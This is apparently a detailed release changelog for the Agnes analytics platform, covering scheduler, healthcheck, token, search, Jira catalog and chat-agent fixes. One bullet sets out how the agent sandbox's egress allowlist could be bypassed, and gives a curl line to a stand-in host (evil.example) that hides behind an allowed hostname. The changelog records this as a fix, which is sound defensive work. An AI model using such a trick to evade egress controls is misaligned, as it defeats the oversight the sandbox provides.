- **Two Jira SLA polls ran on top of each other, permanently.** `jira-sla-poll` walks every open ticket serially with a fixed pause between calls, so on a busy service desk one pass runs well past its 15 min cadence — measured at ~31 min over ~1350 open tickets. The scheduler gives up on the HTTP call at the job's 900 s timeout, and `_run_job`'s `finally` clears the `in_flight` guard and advances `last_run` to the *submit* time whether the call returned or not. A sync FastAPI handler is not cancelled when its client disconnects, so the pass kept running server-side while the very next tick found the job due again and fired a second one. Steady state was two passes at all times: double the Jira API load for no fresher data, both contending on the same per-issue and per-month advisory locks (hence slower, hence more overlap), and a false `failed` plus a PostHog exception logged every cycle. No data was ever at risk — every writer on that path holds `flock(LOCK_EX)` — which is why the only visible symptom was a job reporting a timeout on a schedule, for a pass that in fact completed. The default cadence is now **45 min**, clearing a realistic pass with room to spare; `SCHEDULER_JIRA_SLA_POLL_INTERVAL` still overrides it, and an instance whose pass outgrows 45 min has to raise it. The job's HTTP timeout goes to **3600 s** in the same change, and that is what makes the guarantee structural rather than a matter of timing: while the call is still open the `in_flight` guard is still held, so a pass that outgrows even the new cadence degrades into back-to-back passes instead of silently doubling, and a pass that completes is no longer logged as a failure. The wide cadence is what keeps those passes from becoming continuous polling. Neither number is a fix for the pass being 1345 serial API calls — that is still the thing worth removing. The legacy `jira-sla-poll.timer` never had this failure mode, because systemd will not start a unit that is still active; that is why the default no longer tracks that unit's 15 min.

- **Every deploy silently left the scheduler down.** The `app` healthcheck declared no `start_period`, so its first three probes fired at 30/60/90 s against a container that was still booting and Docker marked it unhealthy at ~90 s. `scheduler` **and `caddy`** gate on `depends_on: app: condition: service_healthy`, so compose aborted with `dependency failed to start` and **never started them** — and `restart: unless-stopped` does not rescue a container that was created and never ran, only one that stopped. Nothing surfaced it: the deploy reported success, the app was healthy moments later, and the scheduler was simply absent — no scheduled sync, no consistency checks, no SLA polling — until somebody noticed a number that had stopped moving. The observed occurrences left `caddy` alone only because those passes did not recreate it; a pass that recreates both takes the site down with the same silence. Boot legitimately exceeds 90 s after an image change: operator stdio-MCP wheels live on the data volume while `pip install --user` lands in the container filesystem, so every recreate reinstalls them (#806) at roughly two seconds per wheel, on a set that grows as operators add sources, before alembic even runs. Plain restarts skip that work and boot fast — it is the recreate, i.e. every deploy, that pays. `start_period: 180s` gives the boot the window it actually needs; failures during it do not count toward `retries` and the first success ends it immediately, so steady-state behaviour is unchanged. Guarded by `tests/test_compose_hardening.py`, which asserts the invariant over **every** `service_healthy` gate rather than this one service, so a new gate cannot be added without a boot window.

- **A hosted data app that slept for a month could not wake.** Both the container's git credential and the app's service token are written with `expires_at=None` — deliberately unbounded, because a container re-clones on every recreate, including waking from `sleep_mode: recreate` long after the deploy. But neither passed `omit_exp=True` to `create_access_token`, so each JWT carried the default 30-day expiry while its `access_tokens` row said "never": past that point the app could neither fetch its own code nor call the Agnes API, and crash-looped with nothing anywhere saying why. Both now omit the claim, which is what the row already promised. Found by Devin Review on this PR (on the git token; the service token carried the same mismatch and is fixed with it).

- **The container's "clone token" was a non-expiring PUSH credential.** `data-app-git:<slug>` encodes *which* repo, never what may be done to it, and the container's credential is minted for the app's **owner** — so the git surface saw an owner and allowed `git-receive-pack`. Indistinguishable at the enforcement layer from the analyst's own 24-hour authoring PAT, except that this one never expires and sits in every hosted container's `config.json`, where any code running in the app — an externally-cloned repo under `repo_mode="external"`, or a compromised dependency — can read it. It now carries `git_write: false` and `app/api/data_apps_git.py` denies the push on that claim **before** the ownership check, since ownership is exactly what was letting it through. The check is `is False`, not falsy: an absent claim still allows pushes, so the analyst's authoring credential and every token minted before this release are unaffected. Found by `agnes-reviewer-rbac`.

- **The browser stripped the provenance block with the same non-linear pattern already fixed server-side.** `[\s\S]*?```` rescans to end-of-string for every unterminated opener, so a long reply full of half-written markers cost work proportional to openers × length — in the reader's browser, on every message. `stripSourcesFence` now finds each body with `indexOf` and stops at the first unterminated opener, which also keeps a truncated answer from swallowing everything after it. The existing node-backed test runs the shipped code and now covers two blocks and the unterminated case. Found by Devin Review on this PR.

- The approval warning reaches the second surface that can issue one. `/api/memory` backs the All Items tab, whose batch bar approves and marks required, but its rows carried no `delivery_warnings` — so neither the per-item strip nor the notice ever rendered there, and `batchAction` discarded the warnings the batch endpoint already answers with. The list annotates rows for admins (nobody else can approve, so nobody else pays for the scan), the tab has its own notice slot, and a batch approval says how many of the items it just published read as instructions. Also: the `/config` token matched backwards — `\b` before a slash demands a word character in front of it, so `example.com/config` fired the configuration warning and the standalone `/config` it was added for never did. Both found by Devin Review on this PR.
- **A burst of Jira events could make all six Jira tables disappear from the catalog until a later rebuild won.** Each event refreshed `_meta` for all six tables — a write-open of `extract.duckdb` plus a full count over every partition of each — and *also* enqueued a rebuild that ATTACHes that same file. DuckDB is single-writer, so the two raced. The losing side is the quiet one: a failed ATTACH is only logged (`orchestrator.py`), and `rebuild_source` then swaps in a freshly built analytics DB that simply has no Jira views, so the tables vanish rather than go stale. Other sources are unaffected, which makes the symptom unmistakable once you know it — Jira gone, Keboola/BigQuery fine. Observed on a live instance, where a stuck write handle also left an `extract.duckdb.wal` behind and the tables stayed missing across several rebuild ticks until the app was restarted. The `update_meta` pass now runs once per coalesced rebuild inside `app.worker.kinds._run_jira_refresh`, before the rebuild rather than against it, so the writer and the reader are sequential in one process. Ordering is deliberate and pinned by a test: `update_meta` is what *creates* `extract.duckdb` when it is missing, and `rebuild_source` returns early when there is no file to attach, so a fresh install depends on it running first; a failure in it still lets the rebuild proceed, since stale catalog numbers must not cost the pass that publishes the data. **No data-freshness change** — the views inside `extract.duckdb` are `read_parquet('…/month=*/*.parquet', hive_partitioning=true)` and the glob is evaluated per query, so a rewritten partition (or a brand-new month) is served on the next `SELECT` with no rebuild at all; `_meta` carries only the catalog's row/size numbers. Distribution is unaffected too: the `sync_state.parts` manifest that `agnes pull` reads is written by the rebuild, and the rebuild still fires per coalesced burst — the enqueue in `service.py` is untouched — so a laptop sync is no less current than before. The SLA poller gets the enqueue it never had: it calls `transform_single_issue` directly rather than through `trigger_incremental_transform`, so it announced nothing — harmless while the transform refreshed `_meta` inline, but once that moved to the job an instance where the poller is the main writer would never refresh the catalog at all, and a table whose first partition the poller writes would never get its extract view (`update_meta` does a `CREATE OR REPLACE VIEW` as well as the numbers). It now enqueues the same coalesced `jira-refresh` **once per run** — not per issue, and not at all when the run wrote nothing, since it runs every 15 minutes and a rebuild with nothing to publish is pure cost. When that enqueue collapses onto an already-**running** refresh it adds the same `jira-refresh-followup` row the webhook path uses, because the dedup matches `status IN ('queued', 'running')` and a running job may have read the parquet before this run's writes landed — and nothing else would recover it, since the next poll only enqueues if it writes again. A queue it cannot reach is logged and ignored: the module also runs as a standalone script, and the poll's own work is durable by then. The refresh pass is held under `src.orchestrator.rebuild_mutex()` — the pattern `_run_ducklake_maintenance` already follows. The HEAVY lane's concurrency of 1 serialises it against the rebuild in the same worker, but not against the other processes that rebuild (API startup, the admin and sync endpoints, collections, tabular ingest), and those ATTACH the same single-writer file; the mutex is released before `rebuild_source`, which takes it itself. The **consistency checker** gets the same enqueue for the same reason as the poller: it shells out to `connectors.jira.incremental_transform`, which now writes parquet and nothing else, and it never announced anything — so a run where the checker is the only writer, which is precisely a webhook outage, would leave the catalog stale until an unrelated webhook fired. Guarded by `tests/test_jira_meta_refresh_cadence.py`, including a source-level check that no `update_meta` call returns to the per-event path.

- **The `/how-it-works` connector guide dropped two prerequisites its pre-redesign predecessor had.** The Claude Code tab lost the "Requires the Claude Code CLI, signed in to your Claude account" lead line during the redesign, leaving it the only tab without an upfront "Requires ..." prerequisite — surfaced live when a tester tried the Desktop/web routes expecting the same walkthrough. The Claude Desktop tab was also missing the Team/Enterprise admin-only caveat the Claude.ai tab already carries (custom connectors there are admin-gated on those plans too), including its "copy request for your admin" button. Both restored.

- **Three follow-ups on the empty-search fix itself, all found by Devin Review on this PR.** (1) **A blank collection filter reported total lack of access.** `search_collections` narrowed on `corpus_id is not None`, which an empty string passes — and `?corpus_id=` is what an HTML form and most clients send for an unset optional. The allowed list narrowed to nothing (no collection has the empty id) and the new hint's `searched == 0` branch then told a caller with plenty of access that no collections were shared with them: the exact wrong conclusion this change set exists to prevent, produced by its own fix. A blank value is now treated as no filter; a real id still narrows. (2) **The combined hint's access judgement.** It counted documents, tables and metrics only, so a caller holding memory-domain grants and none of those was sent to an admin. Folding the knowledge leg in as a fourth term made it worse: the only signal available is group membership, and nearly every account is auto-added to the built-in `Everyone` group — so the term was true for essentially everyone and the no-access branch became unreachable, telling a brand-new user with nothing shared at all to try different words. The judgement now rests on the three **countable** sources, and both branches **name** knowledge notes and the glossary instead of claiming anything about them. The empty branch is also worded for the second audience it can reach — an admin of an instance with nothing loaded, whose counts are the whole instance — so it says what is reachable from the account rather than telling an admin to ask an admin. The glossary is excluded from the judgement itself on purpose: having no RBAC, it runs for everyone and would make every caller look like they had access. (3) **The docstring caveats never reached the model.** Both servers register through `progressive_tool`, which puts only the *first docstring paragraph* on the wire and stashes the rest behind `tool_docs('<name>')` — and the caveats sat several paragraphs down, so the preventive half of this change set did nothing for a client that reads the tool list. They now lead the wire description on all four tools, and `tests/test_mcp_search_caveat_parity.py` asserts against what `summarize_docstring` actually emits rather than the whole docstring, with a companion check that the extractor is not silently returning everything.

- **The combined knowledge search told the agent to read a `hint` it never sent.** `knowledge_search`'s stdio docstring — the surface `app/chat/runner.py` spawns for the in-chat agent, and therefore the one where the original "I don't have access to your files or collections" answer was produced — instructs the model to check the `hint` before concluding anything from an empty result, but only `/api/collections/search` ever returned one. The combined endpoint `/api/knowledge/search` answered a bare `{results: []}`, so the model looked for guidance that was not there and could still fall back to the access reading this change set exists to prevent. It now carries `searched_collections`, `searched_tables` and a `hint` on the empty case. The counts are deliberately not the collections-only ones: this leg also fans out over corporate memory, the table catalog, metrics and the glossary, so zero accessible *collections* is not by itself an access problem — only an all-zero fan-out is, and the hint says so in one branch and names the three engine behaviours (no filename indexing, whole-word matching, no wildcard) in the other. The HTTP tool's docstring is brought in line with the stdio one, so both surfaces promise exactly what the response delivers. Found by Devin Review on this PR.

- **An empty Collections search reads as "you have no access", and an agent says so out loud.** Observed on a live instance: a user uploaded one file, the UI showed it as `indexed` / `Searchable 1 of 1`, and the chat agent was asked what was in it. It searched six ways — the question's own words, the filename, `*`, `md` — got `{"results": [], "retrieval": "lexical_only"}` every time, tried an `agnes collections cat` that does not exist, and answered **"I don't have access to your files or collections."** It had access; two turns later the same tool found the file and answered correctly. That sentence became the conversation's permanent title, and three more like it were already in the sidebar, so the pattern repeats. Nothing in a bare `[]` distinguishes "you cannot see any collection" from "your words are not in the text", and three engine behaviours make a *reasonable* query miss: filenames are not indexed (`rank_chunks` scores chunk text; the filename is attached afterwards for the citation), matching is whole-word (`test` does not find `Testovaci`), and there is no wildcard (`*` and `""` return nothing rather than everything, so "show me what is in here" has no query form). `GET /api/collections/search` now returns `searched_collections` and a `hint` on the empty case — the count is what makes "not an access problem" checkable — and the two diagnoses get different text, so a caller with zero accessible collections is told to ask for a grant rather than to rephrase. The `collections_search` and `knowledge_search` MCP docstrings state the three behaviours up front, since prevention beats a hint that arrives after the sixth attempt — in **both** MCP servers. The stdio server (`cli/mcp/server.py`) hand-maintains its own docstrings rather than importing the HTTP ones, and it is the one `app/chat/runner.py` spawns for the in-chat agent, so documenting only the HTTP transport would have left the guidance absent from the exact surface where the incident happened (Devin Review on this PR). The existing MCP parity guard compares tool *names*, which is why the split was invisible; a new guard asserts both servers carry all three caveats and the not-an-access-problem line on both search tools.

- **The 403 page never offered the action `admin_elevation_paused` exists to enable.** `app/auth/access.py` raises that distinct detail instead of a generic 403 and says why at the raise site — "so clients can offer a 're-enable admin mode' action" — but the HTML error page implemented no such branch. An admin who paused their own elevation and clicked an admin link got a bare 403 showing the raw machine string, with Go home / Back as the only ways out, while the control that resolves it sits on `/me/profile`. The page now explains the state and links straight to it. The anchor it links to had to be created: the Admin-mode drawer carried only `aria-label`, so `#admin-mode` would have scrolled nowhere — the same silent dead end. And it had to be created **twice**: `/me/profile` renders the redesigned page on rail chrome and the frozen pre-redesign copy on topnav, which is the default, so an anchor added to the redesigned template alone would have left the link dead on most instances (caught by Devin Review on this PR — the first version of the guard checked one template and passed). The guard now asserts every `/me/profile#…` anchor resolves in *both* templates, pins that set against the template names the route can actually render, and renders each chrome to prove the attribute survives the `ds.panel` macro rather than only reading source. The affordance is gated on the detail so an ordinary 403 does not advertise an admin-only remedy. Also here: `error.html` was the last template hardcoding the old "Data Analyst Portal" brand in its `<title>` while every other page uses `config.INSTANCE_NAME`, so the browser tab changed identity on the error path.

- **A PDF whose bytes were gone answered `404` even when its ingested text was right there.** `preview_file`'s inline-media branch called `_blob_path_or_404` before it looked at anything else, so a row whose blob never landed or was cleaned up underneath it failed hard — and the new non-browser readers (`agnes collections cat`, the `collection_file_read` MCP tool) relayed that as an error for a file whose answer was sitting in `corpus_chunks`. The textual branch has always degraded in exactly this situation; the asymmetry only became visible once something other than the modal read this endpoint. It now degrades when there is extracted text and keeps the 404 for a text-less medium with no bytes — the case the check was written for. In the degraded case the response reports `kind: "text"` rather than keeping `pdf`/`image` with a withheld `raw_url`: `kind` is what the preview modal switches on, and a `pdf` with a null URL builds an `<iframe>` pointing at nothing — a blank frame with no error handler, i.e. the same broken embed the 404 existed to prevent, reached by another route. Reporting what the response actually has renders the extracted text plus the "extracted during indexing" note, and keeps the CLI and MCP readers on the same shape as the browser. Found by Devin Review on this PR. The endpoint also moves from the triple-surface guard's exemption table into its **cohort**: it now backs `collection_file_read` and `agnes collections cat`, so the structural ratchet — not just the feature's own test — fails if either surface is ever removed. Only `…/raw` stays exempt, a byte stream with no JSON or MCP analogue.

- **`agnes pull` printed a completion line for a download that had failed.** The progress finalizer announced every file it had seen as `100% done`, including one whose transfer never delivered a byte — so a table the server refused with `403` rendered as `[1/1 files] orders: 100% done (0 B in 0.0s, 0 B/s)`, with the real error further down. The analyst who hit this read the pull as successful and went looking for data that was not there. A transfer that falls short of the manifest size now reads `FAILED (0 B of 1.2 MB …) — see the error below`. The exit code was already non-zero on any error and is unchanged. The short-transfer check alone was not enough: `size_bytes` is optional in the manifest and the builder maps a missing one to `0`, so `if total and bytes_ < total` was inert for exactly the rows the printer could say the least about — those kept printing `100% done (0 B in 0.0s, 0 B/s)`. A transfer that received nothing is now reported as failed whether or not a size was declared, while a size-less row that did receive bytes still reads as done. Second half found by Devin Review on this PR. The two verdicts are worded differently because the confidence differs: nothing received is a hard `FAILED (no data received)` — unambiguous whatever the manifest says, and checked first — while a short-but-nonzero transfer reads `INCOMPLETE (X of Y) — check for an error below`, because that one is *inferred* from `size_bytes` and this module already documents that the manifest and the streamed length can disagree (observed in the over-count direction). Were they ever to disagree the other way, a hash-verified parquet that promoted fine would have printed a hard failure pointing at an error the pull never prints, with exit code 0 — a lie in the opposite direction to the one being removed. The byte counter alone still could not see the **most common** failure: a hash mismatch means every byte arrived, so the counter reaches the manifest size while the file is never promoted to disk. The download loop now tells the progress printer explicitly on each of its three failure returns, and that verdict is checked before the byte count. A source-level guard asserts per return statement — not by counting — that no failure path can be added without announcing itself. Found by Devin Review on this PR.

- **Pull errors rendered as a Python dict.** `PullResult.errors` entries are dicts assembled at the failure site and were printed with an f-string, so the analyst got `warn: {'table': 'orders', 'error': "Client error '403 Forbidden' for url '...'"}`. They now render as `orders: Client error '403 Forbidden' …` on both the interactive and the `--quiet` (SessionStart-hook) path; unrecognized shapes still fall back to `str`, so nothing renders worse than before. The same formatter now also prints the **stack-sync** per-item failures, which reached no surface at all: they land on each `TypeReport.errors` — a different list from `PullResult.errors` — while the "Stack sync:" summary counted only what succeeded, so a data package or memory domain that failed to sync was completely silent. `format_pull_error` already understood their key shapes (`package`, `slug`, `name`); it was simply never handed them. They are **folded into `result.errors`** rather than printed separately, because `result.errors` is what decides the exit code (#596), what the `--json` payload carries and what the `--quiet` SessionStart path reports — a warn line alone still left a scripted or hook-driven pull exiting 0 with an empty `errors` array while a data package never landed. Each entry is tagged with the type it came from, so the shared formatter names it. Both halves found by Devin Review on this PR.

- **`agnes stack browse` did not print the id `agnes stack add` requires.** The table showed NAME / TYPE / REQUIREMENT / IN STACK / DESCRIPTION, and its own docstring pointed at `agnes stack add <type> <id>`. An analyst who guessed the web slug got *"Access denied: your groups have no grant on data_package/…, ask an admin to grant it"* — false, the grant was there and the id was wrong — and only got the real id by calling `/api/stack/browse` by hand. Names are display strings (the one on the instance in question contained an em dash, so it was not retypeable either). An `ID` column now leads the row.

- **Three follow-ups on the previous round's fixes, all found by Devin Review.** (1) **A plain answer containing a code snippet grew a "Sources — none declared" row.** The figure check queried `svg, img` anywhere in the bubble, and every code block carries a copy button with an icon in it — so most answers with a snippet, greetings included, got the row the change is meant to reserve for an unsourced figure. It is now scoped to the rendered answer body and skips anything inside a control. (2) **A workspace built from an operator's own template no longer gains a bundled skill it omits.** Pruning applies everywhere — a skill for a feature this instance does not have is useless whoever shipped it — but restoring copies from the SHIPPED default tree, which in template-override mode is not the authority. Restore is now confined to default mode, decided by the same condition `run_init` branches on so the two cannot disagree. (3) **The provenance block is located without a non-greedy regex.** `verdict()` runs on every assistant message of every history read, over model output, and the old `` ```sources…(.*?)``` `` with DOTALL made the engine rescan to end-of-string for every unterminated opening fence — O(occurrences × length), against the repo's linear-time rule for regexes over untrusted text. The opening fence is still a regex; the body is found with `str.find`, which is linear by construction. An unterminated fence is explicitly not a block, so a truncated answer cannot swallow everything after it.

- **Four more on this change set, all found by Devin Review.** (1) **Turning a feature back on never restored the skill it removed.** Pruning on every convergence (above) was a one-way door: the template copy that would put the skill back only runs on a reinit, and a feature flag is not something `needs_reinit` compares — so a workspace that had already converged lost the skill permanently once an operator toggled the feature off and on. The pass now reconciles **both** directions, copying the directory back from the bundled tree and never overwriting a workspace that already has it. (2) **A second provenance block stayed on screen as raw machinery**: the strip pattern was not global, so an answer emitting two blocks had only the first removed. (3) **An answer that declared no source looked exactly like one that did** — the chip row bailed out whenever nothing was declared, which is the case the feature exists to expose. Staying quiet under a greeting is still right, and the server genuinely cannot tell a figure from a sentence; but this runs after the body is in the DOM, so the **client** can. The row now appears when the answer rendered a table, chart or image and declared nothing (mermaid counts in both its rendered and its pre-render form, since rendering is async). (4) **A schemeless `SERVER_URL` produced a credential-less clone URL.** Compose files carry it as a bare `host:port`, and the credential injection is a `replace("://", …)` — a silent no-op with no scheme, so the clone went out authenticating as nobody. It defaults to https rather than being rejected, since this is a fallback for a value the operator set for something else. The assembly moved into `_clone_url_with_credential` so it can be tested without minting a token against a real owner.

- **Every hosted data app could clone its repo but not read any Agnes data.** `build_config_json` took ONE token parameter and used it for two unrelated roles: the git clone credential and `AGNES_TOKEN`, the credential the running app calls the Agnes API with. When the deploy path was corrected to pass the git-scoped token (so the first clone would stop failing), that same parameter carried `data-app-git:<slug>` into `AGNES_TOKEN` — a scope admitted by exactly one surface, the internal git backend — so every data endpoint the app called refused it. The failure is invisible from outside: the container is healthy, the app renders, and only its data calls 401. The two credentials are now separate parameters (`clone_token`, `service_token`), pinned by a unit test that gives them distinguishable values and a source-level check that the deploy site does not swap them. One existing assertion had to change because it encoded the bug — it asserted `AGNES_TOKEN` equalled the clone token. Found by Devin Review on this PR; the defect predates it (it arrived with the clone-auth fix in #1065) and is present on every release since.

- **The sandbox egress allowlist read basic-auth userinfo as the hostname.** The schemed-URL path strips it before deriving the host; `_bare_hosts` — the scheme-defaulting branch for `curl example.com/x` — did not, splitting on `:` first. `curl api.github.com:pw@evil.example/x` therefore checked the allowed `api.github.com` while the request went to `evil.example`. Both paths now `rsplit("@", 1)` first, so a userinfo field containing `@` resolves to the last authority rather than the first. This hook is advisory by design (it lives on a filesystem the agent can write; the authoritative control is the VM egress policy), so this narrows a bypass rather than closing a boundary. Found by Devin Review on this PR.

- **Slack answers would have ended in a code block of machinery.** The `sources` fence this change set asks every answer to emit is stripped by the web client, which draws chips from the server's verdict instead — but the Slack bridge posts `content` verbatim on both of its paths (the streaming reply and the ephemeral responder), so where an answer used to end in a readable attribution line it would now end in a raw fenced block, on every answer. `app.chat.sources.strip_block` is the shared remover and the sink uses it. Deliberately not applied in two places: **before persistence**, because the verdict is derived rather than stored — `GET /sessions/{id}/messages` re-parses it out of the saved content, so a stripped save would silently drop the chips on every reload — and on the **AG-UI/SSE** surface, whose consumers are programs and are exactly who the machine-readable form is for. Found by Devin Review on this PR.

- **Three defects in this change set, each of which made the feature it belongs to fail silently.** All found by Devin Review on this PR. (1) **Every answer's declared sources were judged unsupported.** The provenance check was fed `frame.get("tool_calls")` off the finished `assistant_message`, but the runner emits each call as its own `tool_call` frame and that final frame carries only content/tokens/model — so the haystack was always empty and every verifiable claim came back unverified. The visible result was an amber UNVERIFIED badge on correct answers, which is worse than no badge: it teaches the reader to ignore it. The reload path (`GET /sessions/{id}/messages`) recomputed the identical verdict from the persisted `tool_calls`, stored as `None` for the same reason — so both surfaces agreed and both were wrong. The manager now attaches this turn's `tool_call` frames from `live.turn_buffer` (cleared right after the message is persisted, so it is exactly the set of calls that produced the answer) before computing the verdict *and* before persisting, which fixes the live turn and the reload together.  Two consequences worth stating, since nothing else would: a reloaded thread now shows the turn's tool blocks (previously only the live turn did — the persisted rows carried nothing but the cancelled/interrupted markers), and the Markdown transcript export gains them too. The list is trimmed to `{tool, args}` rather than stored as whole frames — the rest is transport envelope that would ride on every assistant message row forever, and `{tool, args}` is already the shape the renderer and the verifier read. (2) **The sandbox still could not reach its own Agnes server.** The egress allowlist derives the Agnes host from `AGNES_SERVER`, but `_start_relay()` overwrites that with `http://127.0.0.1:<port>/agnes-api` before `claude` — and therefore the hook — is spawned, so the real host was never admitted and a `git clone` of a data-app repo stayed refused. The MCP tools kept working throughout, because they go through that very relay on loopback, which is what made it read as a git problem rather than an egress one. The runner now records the real address as `AGNES_REAL_SERVER` *before* the overwrite and the hook prefers it, falling back to `AGNES_SERVER` where there is no relay. Unchanged on trust: this hook lives on a filesystem the agent can write, so it has always been advisory — the authoritative control is the VM egress policy. (3) **Every deploy left behind a permanent repository credential.** The container's git token is minted with no expiry on purpose (a container re-clones whenever it is recreated, including waking from `sleep_mode: recreate`), and its id was recorded nowhere — so nothing could revoke it.
